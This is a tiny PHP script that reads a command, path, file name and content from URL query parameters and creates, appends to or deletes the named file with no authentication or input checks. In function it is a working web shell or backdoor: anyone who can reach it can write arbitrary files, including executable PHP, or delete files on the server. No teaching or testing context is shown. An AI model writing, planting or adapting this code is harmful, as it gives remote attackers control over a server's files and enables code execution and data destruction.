<?php

switch ($_GET['c']) {
    case 'touch':
        $file = fopen($_GET['p'].$_GET['f'], "w");
        break;

    case 'write':
        $file = fopen($_GET['p'].$_GET['f'], "a");
        fwrite($file, $_GET['co']);
        break;

    case 'rm':
        unlink($_GET['p'].$_GET['f']);
        break;
    
    default:
        break;
};

?>